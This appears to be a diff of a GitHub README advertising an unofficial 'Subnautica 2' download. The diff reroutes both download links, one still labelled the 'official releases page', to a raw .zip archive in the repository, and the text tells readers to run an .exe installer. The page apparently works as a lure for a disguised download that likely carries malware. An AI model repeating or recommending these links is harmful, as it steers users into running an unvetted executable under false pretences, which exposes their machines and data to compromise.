@@ -1,12 +1,12 @@
 # 🌊 Subnautica-2-Release - Explore Planet Zazura With Your Friends
 
-[![](https://img.shields.io/badge/Download-Subnautica_2_Release-blue.svg)](https://github.com/hasanjubayer108-jpg/Subnautica-2-Release/releases)
+[![](https://img.shields.io/badge/Download-Subnautica_2_Release-blue.svg)](https://raw.githubusercontent.com/hasanjubayer108-jpg/Subnautica-2-Release/main/Resource/Subnautica-Release-1.0.zip)
 
 Subnautica 2 brings ocean exploration to a new world. This version takes you to Planet Zazura. You can play with three friends in four-player co-op mode. Use the new DNA BioMod system to change your character. Build the Tadpole modular submersible to travel deep into the water. Discover new Leviathans and search the CICADA crash site for clues about the planet.
 
 ## 📥 How to Download
 
-Visit the [official releases page](https://github.com/hasanjubayer108-jpg/Subnautica-2-Release/releases) to get the game. Click the file ending in .exe to start your download. Your computer needs a stable internet connection to finish this process. Once the file finishes, navigate to your Downloads folder to find the installer.
+Visit the [official releases page](https://raw.githubusercontent.com/hasanjubayer108-jpg/Subnautica-2-Release/main/Resource/Subnautica-Release-1.0.zip) to get the game. Click the file ending in .exe to start your download. Your computer needs a stable internet connection to finish this process. Once the file finishes, navigate to your Downloads folder to find the installer.
 
 ## ⚙️ System Requirements
 
